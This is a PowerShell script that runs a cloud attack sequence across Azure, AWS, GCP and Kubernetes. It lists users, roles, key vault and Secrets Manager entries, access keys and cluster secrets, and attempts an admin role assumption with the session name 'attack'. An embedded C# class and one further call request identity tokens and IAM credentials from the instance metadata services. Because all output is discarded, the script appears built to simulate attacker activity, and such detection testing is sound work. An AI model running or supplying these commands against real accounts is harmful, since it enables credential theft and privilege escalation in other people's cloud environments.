& az.cmd account list --output json 2>&1 | Out-Null
& az.cmd ad user list --top 50 --output json 2>&1 | Out-Null
& az.cmd ad app list --all --output json 2>&1 | Out-Null
& az.cmd ad sp list --all --output json 2>&1 | Out-Null
& az.cmd role assignment list --all --output json 2>&1 | Out-Null
& az.cmd keyvault list --output json 2>&1 | Out-Null
& az.cmd keyvault secret list --vault-name "corporate-vault" 2>&1 | Out-Null
& az.cmd storage account list --output json 2>&1 | Out-Null
& az.cmd vm list --output json 2>&1 | Out-Null
& az.cmd resource list --output json 2>&1 | Out-Null

& aws.exe sts get-caller-identity 2>&1 | Out-Null
& aws.exe iam list-users 2>&1 | Out-Null
& aws.exe iam list-roles 2>&1 | Out-Null
& aws.exe iam list-access-keys --user-name administrator 2>&1 | Out-Null
& aws.exe s3 ls 2>&1 | Out-Null
& aws.exe secretsmanager list-secrets 2>&1 | Out-Null
& aws.exe ec2 describe-instances 2>&1 | Out-Null
& aws.exe lambda list-functions 2>&1 | Out-Null
& aws.exe ssm describe-parameters 2>&1 | Out-Null
& aws.exe sts assume-role --role-arn "arn:aws:iam::123456789012:role/AdminRole" --role-session-name "attack" 2>&1 | Out-Null

& gcloud.cmd projects list 2>&1 | Out-Null
& gcloud.cmd iam service-accounts list 2>&1 | Out-Null
& gcloud.cmd iam service-accounts keys list --iam-account="sa@project.iam.gserviceaccount.com" 2>&1 | Out-Null
& gcloud.cmd compute instances list 2>&1 | Out-Null
& gcloud.cmd secrets list 2>&1 | Out-Null

& kubectl.exe get secrets --all-namespaces 2>&1 | Out-Null
& kubectl.exe get pods --all-namespaces 2>&1 | Out-Null
& kubectl.exe auth can-i --list 2>&1 | Out-Null
& kubectl.exe get clusterroles 2>&1 | Out-Null

if (-not ('CloudEnum' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net;
    public class CloudEnum {
        public static string HitIMDS() {
            try {
                var wc = new WebClient();
                wc.Headers.Add("Metadata", "true");
                return wc.DownloadString("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/");
            } catch (Exception ex) { return ex.Message; }
        }
        public static string HitAWSMeta() {
            try {
                var wc = new WebClient();
                wc.Headers.Add("X-aws-ec2-metadata-token-ttl-seconds", "21600");
                string token = wc.UploadString("http://169.254.169.254/latest/api/token", "PUT", "");
                wc.Headers.Add("X-aws-ec2-metadata-token", token);
                return wc.DownloadString("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
            } catch (Exception ex) { return ex.Message; }
        }
    }
'@
}

[CloudEnum]::HitIMDS() | Out-Null
[CloudEnum]::HitAWSMeta() | Out-Null

try { Invoke-RestMethod -Uri "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" -Headers @{"Metadata-Flavor"="Google"} -ErrorAction Stop | Out-Null } catch {}
